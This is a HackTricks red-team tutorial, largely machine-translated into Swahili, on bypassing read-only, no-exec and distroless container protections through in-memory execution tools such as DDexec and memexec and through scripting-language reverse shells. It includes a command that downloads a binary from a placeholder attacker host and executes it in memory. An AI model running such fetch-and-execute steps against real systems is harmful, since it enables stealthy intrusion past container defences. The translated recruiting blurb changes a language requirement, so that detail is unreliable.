# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec scenario

Ni kawaida zaidi na zaidi kukutana na mashine za linux zilizowekwa na **read-only (ro) file system protection**, hasa katika kontena. Hii ni kwa sababu kuendesha kontena na mfumo wa faili wa ro ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** katika `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Hata hivyo, hata kama mfumo wa faili umewekwa kama ro, **`/dev/shm`** bado itaandikwa, hivyo ni uongo hatuwezi kuandika chochote kwenye diski. Hata hivyo, folda hii itakuwa **imewekwa na ulinzi wa no-exec**, hivyo ikiwa utashusha binary hapa huwezi **kuweza kuitekeleza**.

{% hint style="warning" %}
Kutoka kwa mtazamo wa timu nyekundu, hii inafanya **kuwa ngumu kupakua na kutekeleza** binaries ambazo hazipo kwenye mfumo tayari (kama backdoors au enumerators kama `kubectl`).
{% endhint %}

## Easiest bypass: Scripts

Kumbuka kwamba nilitaja binaries, unaweza **kutekeleza script yoyote** mradi tu mfasiri yuko ndani ya mashine, kama **shell script** ikiwa `sh` inapatikana au **python** **script** ikiwa `python` imewekwa.

Hata hivyo, hii haitoshi kutekeleza backdoor yako ya binary au zana nyingine za binary unazoweza kuhitaji kuendesha.

## Memory Bypasses

Ikiwa unataka kutekeleza binary lakini mfumo wa faili haukuruhusu hilo, njia bora ya kufanya hivyo ni kwa **kuitekeleza kutoka kwenye kumbukumbu**, kwani **ulinzi hauwezi kutumika huko**.

### FD + exec syscall bypass

Ikiwa una injini za script zenye nguvu ndani ya mashine, kama **Python**, **Perl**, au **Ruby** unaweza kupakua binary ili kuitekeleza kutoka kwenye kumbukumbu, kuihifadhi katika file descriptor ya kumbukumbu (`create_memfd` syscall), ambayo haitalindwa na ulinzi huo na kisha kuita **`exec` syscall** ikionyesha **fd kama faili ya kutekeleza**.

Kwa hili unaweza kwa urahisi kutumia mradi [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kupitisha binary na itaunda script katika lugha iliyoonyeshwa na **binary iliyoshinikizwa na b64 encoded** na maagizo ya **kufungua na kuikandamiza** katika **fd** iliyoundwa kwa kuita `create_memfd` syscall na wito kwa **exec** syscall kuikimbia.

{% hint style="warning" %}
Hii haifanyi kazi katika lugha nyingine za scripting kama PHP au Node kwa sababu hazina njia yoyote ya **kawaida ya kuita raw syscalls** kutoka kwenye script, hivyo haiwezekani kuita `create_memfd` kuunda **memory fd** kuhifadhi binary.

Zaidi ya hayo, kuunda **fd ya kawaida** na faili katika `/dev/shm` haitafanya kazi, kwani hutaruhusiwa kuikimbia kwa sababu **ulinzi wa no-exec** utaweza kutumika.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni mbinu inayokuruhusu **kubadilisha kumbukumbu ya mchakato wako** kwa kuandika tena **`/proc/self/mem`**.

Hivyo, **kuweza kudhibiti msimbo wa mkusanyiko** unaotekelezwa na mchakato, unaweza kuandika **shellcode** na "kubadilisha" mchakato ili **kutekeleza msimbo wowote wa kawaida**.

{% hint style="success" %}
**DDexec / EverythingExec** itakuruhusu kupakia na **kutekeleza** shellcode yako mwenyewe au **binary yoyote** kutoka **kumbukumbu**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa maelezo zaidi kuhusu mbinu hii angalia Github au:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni hatua ya asili inayofuata ya DDexec. Ni **DDexec shellcode demonised**, hivyo kila wakati unapotaka **kuendesha binary tofauti** huwezi kuanzisha tena DDexec, unaweza tu kuendesha memexec shellcode kupitia mbinu ya DDexec na kisha **kuwasiliana na demon hii ili kupitisha binaries mpya za kupakia na kuendesha**.

Unaweza kupata mfano wa jinsi ya kutumia **memexec kutekeleza binaries kutoka kwa PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Kwa kusudi linalofanana na DDexec, mbinu ya [**memdlopen**](https://github.com/arget13/memdlopen) inaruhusu **njia rahisi ya kupakia binaries** kwenye kumbukumbu ili baadaye kuziendesha. Inaweza hata kuruhusu kupakia binaries zenye utegemezi.

## Distroless Bypass

### Nini distroless

Mizigo ya distroless ina sehemu tu za **muhimu kabisa zinazohitajika kuendesha programu au huduma maalum**, kama vile maktaba na utegemezi wa wakati wa kuendesha, lakini inatenga sehemu kubwa kama vile meneja wa pakiti, shell, au zana za mfumo.

Lengo la mizigo ya distroless ni **kupunguza uso wa shambulio wa mizigo kwa kuondoa sehemu zisizohitajika** na kupunguza idadi ya udhaifu ambao unaweza kutumiwa.

### Reverse Shell

Katika mizigo ya distroless huenda **usipate hata `sh` au `bash`** kupata shell ya kawaida. Hutaweza pia kupata binaries kama `ls`, `whoami`, `id`... kila kitu ambacho kawaida unakimbia kwenye mfumo.

{% hint style="warning" %}
Hivyo, **hutaweza** kupata **reverse shell** au **kuhesabu** mfumo kama kawaida unavyofanya.
{% endhint %}

Hata hivyo, ikiwa kontena lililovunjwa linaendesha kwa mfano flask web, basi python imewekwa, na hivyo unaweza kupata **Python reverse shell**. Ikiwa linaendesha node, unaweza kupata Node rev shell, na vivyo hivyo na lugha nyingi za **scripting**.

{% hint style="success" %}
Kwa kutumia lugha ya scripting unaweza **kuhesabu mfumo** kwa kutumia uwezo wa lugha hiyo.
{% endhint %}

Ikiwa hakuna **`read-only/no-exec`** ulinzi unaweza kutumia reverse shell yako **kuandika kwenye mfumo wa faili binaries zako** na **kuziendesha**.

{% hint style="success" %}
Hata hivyo, katika aina hii ya mizigo ulinzi huu kwa kawaida utawepo, lakini unaweza kutumia **mbinu za awali za utekelezaji wa kumbukumbu kuzipita**.
{% endhint %}

Unaweza kupata **mfano** wa jinsi ya **kutumia udhaifu wa RCE** kupata lugha za scripting **reverse shells** na kuendesha binaries kutoka kwenye kumbukumbu katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ikiwa unavutiwa na **kazi ya hacking** na kuhack yasiyoweza kuhackwa - **tunatafuta wafanyakazi!** (_kuandika na kuzungumza kwa kiswahili vizuri kunahitajika_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
